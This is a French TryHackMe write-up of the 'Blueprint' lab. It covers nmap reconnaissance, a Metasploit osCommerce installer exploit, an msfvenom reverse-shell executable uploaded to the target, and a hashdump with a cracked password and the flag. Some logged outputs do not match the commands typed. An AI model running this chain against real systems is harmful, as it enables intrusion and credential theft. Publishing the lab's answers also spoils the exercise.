**Blueprint**

```bash
tim@kali:~/Bureau/tryhackme/write-up$ su root
Mot de passe : 
root@kali:/home/tim/Bureau/tryhackme/write-up# sudo echo "10.10.128.202 blueprint.thm" >> /etc/hosts
root@kali:/home/tim/Bureau/tryhackme/write-up# exit
```

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A blueprint.thm
[sudo] Mot de passe de tim : 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-16 19:35 CEST
Nmap scan report for 10.10.128.202
Host is up (0.21s latency).
Not shown: 987 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 404 - File or directory not found.
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/16%OT=80%CT=1%CU=37731%PV=Y%DS=2%DC=T%G=Y%TM=60F1C3B
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=
OS:7)OPS(O1=M506NW8ST11%O2=M506NW8ST11%O3=M506NW8NNT11%O4=M506NW8ST11%O5=M5
OS:06NW8ST11%O6=M506ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M506NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=Z%RUCK=0%RUD=G)IE(R=Y%DFI=
OS:N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m59s, deviation: 34m37s, median: 0s
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:08:88:22:0a:59 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-16T18:36:43+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-16T17:36:43
|_  start_date: 2021-07-16T17:33:34

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   35.01 ms  10.9.0.1
2   303.11 ms 10.10.128.202

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.40 seconds
```

On scan l'adresse avec nmap, on remaque plusieurs chose :
-Il y a trois ports pour les serveurs web, le 80, 443, 8080.

```bash
lynx http://blueprint:80
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
<title>404 - File or directory not found.</title>
<style type="text/css">
<!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;}
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;}
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
-->
</style>
</head>
<body>
<div id="header"><h1>Server Error</h1></div>
<div id="content">
 <div class="content-container"><fieldset>
  <h2>404 - File or directory not found.</h2>
  <h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>
 </fieldset></div>
</div>
</body>
</html>
```

Il y a rien.

```bash
lynx http://blueprint.thm:8080
 [ICO] Name Last modified Size Description
     ________________________________________________________________________________________________________________________________________________________________________________________________________________________________

   [DIR] oscommerce-2.3.4/ 2019-04-11 22:52 -
     ________________________________________________________________________________________________________________________________________________________________________________________________________________________________


    Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 Server at 10.10.128.202 Port 8080
```

Ici on a un lien interne oscommerce-2.3.4


```bash
tim@kali:~/Bureau/tryhackme/write-up$ msfconsole  -q
msf6 > search oscommerce

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/oscommerce_filemanager                2009-08-31       excellent  No     osCommerce 2.2 Arbitrary PHP Code Execution
   1  exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/oscommerce_installer_unauth_code_exec

msf6 > use 1
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > show options

Module options (exploit/multi/http/oscommerce_installer_unauth_code_exec):

   Name     Current Setting    Required  Description
   ----     ---------------    --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80                 yes       The target port (TCP)
   SSL      false              no        Negotiate SSL/TLS for outgoing connections
   URI      /catalog/install/  yes       The path to the install directory
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.26     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   osCommerce 2.3.4.1
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set RHOSTS blueprint.thm
RHOST => 8080
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set RPORT 8080
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set URI /oscommerce-2.3.4/catalog/install
URI => /oscommerce-2.3.4/catalog/install
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set LHOST 10.9.228.66
LHOST => 10.9.228.66
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > run
[*] Started reverse TCP handler on 10.9.228.66:4444 
[*] Sending stage (39282 bytes) to 10.10.128.202
[*] Meterpreter session 1 opened (10.9.228.66:4444 -> 10.10.128.202:49464) at 2021-07-16 21:51:08 +0200
meterpreter >
```

On utilise metasploit.   
On trouve un exploit pour osCommerce.  
On configure l'exploit avec les bonnes options.  
On obtient un reverse shell sous meterpreter.  

```bash
meterpreter > getuid
Server username: SYSTEM (0)
meterpreter > hashdump
[-] The "hashdump" command requires the "priv" extension to be loaded (run: `load priv`)
meterpreter > load priv
Loading extension priv...
[-] Failed to load extension: The "priv" extension is not supported by this Meterpreter type (php/windows)
[-] The "priv" extension is supported by the following Meterpreter payloads:
[-]   - windows/x64/meterpreter*
[-]   - windows/meterpreter*
```

On remarque plusieurs choses.  
-On est administrateur sur la machine SYSTEM (0).  
-Hashdump ne fonctionne pas car notre shell n'est pas stable.  


```bash
tim@kali:~/Bureau/tryhackme/write-up$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.228.66 LPORT=9001 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

Création d'un reverse shell pour windows, il nous reste plus qu'a le transferer sur la machine cible.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ msfconsole -q
msf6 > search multi/handler

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
   2  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
   5  exploit/multi/handler                                                 manual     No     Generic Payload Handler
   6  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
   7  exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
   8  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
msf6 > use 5
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
msf6 exploit(multi/handler) > set 10.9.228.66
LHOST => blueprint.thm
msf6 exploit(multi/handler) > set LPORT 9001
LPORT => 1234
msf6 exploit(multi/handler) > run

[-] Handler failed to bind to 10.10.227.112:1234:-  -
[*] Started reverse TCP handler on 0.0.0.0:1234 
```

On créer un sessions de meterpreter qui écoute notre reverse shell.

```bash
meterpreter > upload shell.exe
[*] uploading  : /home/tim/Bureau/tryhackme/write-up/shell.exe -> shell.exe
[*] Uploaded -1.00 B of 72.07 KiB (-0.0%): /home/tim/Bureau/tryhackme/write-up/shell.exe -> shell.exe
[*] uploaded   : /home/tim/Bureau/tryhackme/write-up/shell.exe -> shell.exe
meterpreter > execute -f shell.exe
Process 4128 created.
```

On télécharge le shell dans la machine cible.  
Puis on l'exécute.  

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
```

Si l'autre meterpreter on récupère le les mots de passes sous forme de hash.  

***

On crack les hash avec [crackstation](https://crackstation.net/)
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::  
aad3b435b51404eeaad3b435b51404ee  
30e87bf999828446a1c1209ddde4c450 googleplus  
La réponse est : googleplus  

```bash
meterpreter > shell
Process 3244 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes>cd C:\Users\Administrator\Desktop                                              
cd C:\Users\Administrator\Desktop 

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\Users\Administrator\Desktop

11/27/2019  07:15 PM    <DIR>          .
11/27/2019  07:15 PM    <DIR>          ..
11/27/2019  07:15 PM                37 root.txt.txt
               1 File(s)             37 bytes
               2 Dir(s)  19,509,260,288 bytes free

C:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```

La réponse à la dernière question est : THM{aea1e3ce6fe7f89e10cea833ae009bee}